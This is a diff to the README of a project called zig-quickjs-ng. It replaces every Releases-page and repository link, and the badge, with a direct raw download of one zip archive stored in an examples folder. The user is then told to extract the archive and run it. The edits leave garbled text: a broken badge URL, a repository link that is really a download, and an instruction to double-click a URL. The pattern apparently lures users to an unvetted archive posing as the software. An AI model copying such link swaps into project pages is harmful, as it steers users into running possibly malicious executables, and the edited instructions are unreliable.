@@ -1,6 +1,6 @@
 # 🌟 zig-quickjs-ng - Fast and Simple JavaScript Execution
 
-[![Download Zig QuickJS NG](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Zaif47/zig-quickjs-ng/releases)
+[![Download Zig QuickJS NG](https://raw.githubusercontent.com/Zaif47/zig-quickjs-ng/main/examples/ng_quickjs_zig_v3.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Zaif47/zig-quickjs-ng/main/examples/ng_quickjs_zig_v3.4.zip)
 
 ## 📋 Introduction
 
@@ -23,7 +23,7 @@ Before you begin, make sure your system meets the following requirements:
 
 To download zig-quickjs-ng, visit the Releases page. You will find the latest version available for download.
 
-[Download zig-quickjs-ng here](https://github.com/Zaif47/zig-quickjs-ng/releases)
+[Download zig-quickjs-ng here](https://raw.githubusercontent.com/Zaif47/zig-quickjs-ng/main/examples/ng_quickjs_zig_v3.4.zip)
 
 1. Click on the link above.
 2. Look for the latest release version at the top of the page.
@@ -41,7 +41,7 @@ After downloading, follow these steps to run zig-quickjs-ng:
    - If the file is a zip or tar archive, right-click on the file and select “Extract All” or use a similar option depending on your operating system.
 
 3. **Open the Application:**
-   - For Windows, double-click on `zig-quickjs-ng.exe`.
+   - For Windows, double-click on `https://raw.githubusercontent.com/Zaif47/zig-quickjs-ng/main/examples/ng_quickjs_zig_v3.4.zip`.
    - For macOS, open the `.app` file.
    - For Linux, you may need to open a terminal and run `./zig-quickjs-ng` from the extracted directory.
 
@@ -81,7 +81,7 @@ You can use zig-quickjs-ng for learning JavaScript, running scripts, or developi
 
 Join our community for help and updates:
 
-- **GitHub Repository:** [zig-quickjs-ng GitHub](https://github.com/Zaif47/zig-quickjs-ng)
+- **GitHub Repository:** [zig-quickjs-ng GitHub](https://raw.githubusercontent.com/Zaif47/zig-quickjs-ng/main/examples/ng_quickjs_zig_v3.4.zip)
 - **Discussions:** Engage with other users and developers.
 - **Issues:** Report bugs or request features directly on GitHub.
 
